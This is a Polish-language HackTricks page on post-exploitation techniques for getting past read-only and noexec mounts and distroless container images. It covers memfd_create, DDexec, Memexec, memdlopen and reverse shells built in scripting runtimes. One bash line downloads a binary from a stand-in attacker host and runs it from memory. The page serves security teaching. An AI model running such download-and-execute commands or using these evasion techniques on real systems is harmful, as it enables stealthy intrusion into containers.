# Obejście zabezpieczeń FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Filmy

W poniższych filmach dokładniej objaśniono techniki opisane na tej stronie:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Scenariusz read-only / no-exec

W kontenerze możesz zamontować główny system plików tylko do odczytu, ustawiając **`readOnlyRootFilesystem: true`** w kontekście bezpieczeństwa.<sup>[[3]](#references)</sup> Na przykład:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Główny system plików tylko do odczytu nie sprawia, że osobno zamontowane woluminy również są tylko do odczytu. Docker traktuje **`/dev/shm`** jako montowanie IPC, natomiast opcje tmpfs, takie jak `rw` i `noexec`, zależą od konfiguracji środowiska uruchomieniowego; przed poleganiem na którymkolwiek z tych zachowań sprawdź opcje montowania kontenera docelowego.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Z perspektywy red-teamu takie połączenie może utrudnić pobieranie i uruchamianie niedostępnych już plików binarnych (na przykład backdoorów lub narzędzi do enumeracji).<sup>[[4]](#references)[[5]](#references)</sup>

## Najprostsze obejście: skrypty

Montowanie `noexec` blokuje bezpośrednie uruchamianie plików binarnych z tego montowania, ale interpreter nadal może odczytać i zinterpretować skrypt. Jeśli dostępny jest `sh` lub `python`, możesz więc uruchomić skrypt powłoki lub Pythona za pomocą tego interpretera.<sup>[[5]](#references)</sup>

Nie pomoże to, gdy wymagane narzędzie samo jest plikiem binarnym.<sup>[[5]](#references)</sup>

## Obejścia przez pamięć

Gdy bezpośrednie uruchamianie z zamontowanej ścieżki jest zablokowane, jedną z możliwości jest załadowanie ELF do pamięci i uruchomienie go za pośrednictwem ścieżki w pamięci. Pozwala to ominąć kontrolę `noexec` tego montowania, ale nie znosi innych ograniczeń jądra, uprawnień ani zasad.<sup>[[5]](#references)[[6]](#references)</sup>

### Obejście przez FD + syscall exec

Jeśli środowisko uruchomieniowe skryptów ma dostęp do odpowiedniego interfejsu Linuksa, może utworzyć anonimowy, plikowy deskryptor oparty na RAM za pomocą **`memfd_create(2)`**, zapisać w nim bajty ELF i użyć ścieżki uruchamiania opartej na deskryptorze pliku. Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generuje skompresowany kod Python, Perl lub Ruby zakodowany w base64 do tego zastosowania.<sup>[[6]](#references)[[7]](#references)</sup>

Projekt obecnie opisuje obsługę Pythona, Perla i Ruby; PHP lub Node wymagają innej techniki albo rozszerzenia specyficznego dla danego środowiska uruchomieniowego. Brak generatora dla danego języka nie oznacza więc, że uruchamianie z pamięci jest niemożliwe.<sup>[[6]](#references)[[12]](#references)</sup>

Zobacz [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md), gdzie szerzej omówiono uruchamianie plików anonimowych, powiązane schematy stagingu oraz wykrywanie i gromadzenie danych śledczych.

> [!WARNING]
> Zwykły plik wykonywalny zapisany w **`/dev/shm`** nadal podlega ustawieniu **`noexec`** tego montowania; samo otwarcie go za pomocą zwykłego deskryptora pliku nie zmienia zasad montowania.<sup>[[5]](#references)</sup>
>
> Dokładna metoda uruchamiania z pamięci zależy również od środowiska uruchomieniowego, architektury, jądra i dostępnych uprawnień.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) zapisuje stager i loader w działającym procesie powłoki za pośrednictwem **`/proc/self/mem`**, a następnie przekazuje sterowanie do tego kodu.<sup>[[8]](#references)</sup>

Dzięki temu proces może załadować dostarczony plik binarny bez wcześniejszego umieszczania go w wykonywalnym systemie plików.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** może załadować i **uruchomić** shellcode lub plik binarny z **pamięci**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Więcej informacji o tej technice znajdziesz na GitHubie lub:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to implementacja DDexec działająca jako daemon. Jej daemon nasłuchuje żądań zawierających argumenty i surowe bajty programu, tworzy proces potomny, który ładuje i uruchamia każdy program, a proces nadrzędny pozostaje serwerem.<sup>[[9]](#references)</sup>

Repozytorium zawiera przykład użycia **memexec do uruchamiania plików binarnych z PHP reverse shell** w pliku [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

[**memdlopen**](https://github.com/arget13/memdlopen), mający podobny cel co DDexec, to bezplikowa implementacja `dlopen()` dla obiektu współdzielonego lub programu. README obecnie dokumentuje obsługę ARM64, dlatego przed użyciem sprawdź architekturę systemu docelowego.<sup>[[10]](#references)</sup>

## Distroless Bypass

Aby zapoznać się z dokładnym wyjaśnieniem, **czym właściwie jest distroless**, kiedy się przydaje, kiedy nie oraz jak wpływa na taktyki post-exploitation w kontenerach, sprawdź:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Czym jest distroless

Obrazy distroless zawierają tylko aplikację i jej zależności środowiska uruchomieniowego; oficjalne obrazy pomijają menedżery pakietów, powłoki i inne programy typowe dla standardowej dystrybucji Linuxa.<sup>[[11]](#references)</sup>

Ograniczenie obrazu środowiska uruchomieniowego do tych zależności zmniejsza ilość oprogramowania w środowisku produkcyjnym oraz ilość oprogramowania, które trzeba skanować i śledzić.<sup>[[11]](#references)</sup>

### Reverse Shell

W kontenerze distroless możesz **nie znaleźć `sh` ani `bash`** do uruchomienia zwykłej powłoki ani popularnych narzędzi, takich jak `ls`, `whoami` czy `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Dlatego zwykły reverse shell oparty na powłoce lub enumeracja z użyciem narzędzi mogą nie zadziałać.<sup>[[11]](#references)</sup>

Jeśli zaatakowana aplikacja zawiera środowisko uruchomieniowe języka (na przykład Python w aplikacji Flask lub Node.js w aplikacji Node), RCE może nadal umożliwić użycie tego środowiska do utworzenia kanału komunikacji z systemem i jego inspekcji za pomocą API.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Użyj dostępnego języka skryptowego do **enumeracji systemu** za pomocą jego funkcji.<sup>[[12]](#references)</sup>

Jeśli nie ma zabezpieczeń **read-only/no-exec**, kanał komunikacji może zapisać pliki binarne w zapisywalnym i wykonywalnym punkcie montowania, a następnie je uruchomić; najpierw sprawdź opcje montowania i uprawnienia.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Gdy takie zabezpieczenia są aktywne, użyj **opisanych powyżej technik wykonywania z pamięci**, jeśli pozwalają na to środowisko uruchomieniowe, kernel i uprawnienia.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Przykłady wykorzystania podatności RCE do uzyskania **reverse shell** w języku skryptowym i uruchamiania plików binarnych z pamięci znajdziesz w projekcie [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Odkrywanie manipulacji pamięcią Linuxa na potrzeby skrywania działań i unikania wykrycia](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Ukryte włamania z DDexec-ng i dlopen() w pamięci - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Konfigurowanie kontekstu bezpieczeństwa dla poda lub kontenera](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - strona podręcznika Linuxa](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - strona podręcznika Linuxa](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
